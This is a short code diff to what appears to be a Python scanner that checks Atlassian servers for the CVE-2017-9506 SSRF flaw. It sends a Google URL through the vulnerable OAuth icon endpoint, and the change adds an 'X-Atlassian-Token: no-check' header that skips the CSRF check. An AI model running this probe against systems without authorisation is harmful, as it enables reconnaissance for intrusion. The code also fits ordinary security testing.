@@ -16,12 +16,16 @@ def check_cve_2017_9506(base_url, output_folder="loot/"):
     print(f"\n{Fore.YELLOW}INFO: Checking for CVE-2017-9506 (SSRF){Style.RESET_ALL}")
     
     vulnerabilities = ''  # String to store discovered vulnerabilities
+    headers = {
+    'X-Atlassian-Token': 'no-check'
+    }
+
     try:
         # Test SSRF with a simple payload
         test_url = "https://google.com"
         check_url = f"{base_url.rstrip('/')}/plugins/servlet/oauth/users/icon-uri?consumerUri={test_url}"
         print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {check_url}")
-        response = requests.get(check_url, allow_redirects=False, verify=False)
+        response = requests.get(check_url, headers=headers, allow_redirects=False, verify=False)
 
         # Check if the SSRF is successful
         if response.status_code == 200 and "googlelogo" in response.text:
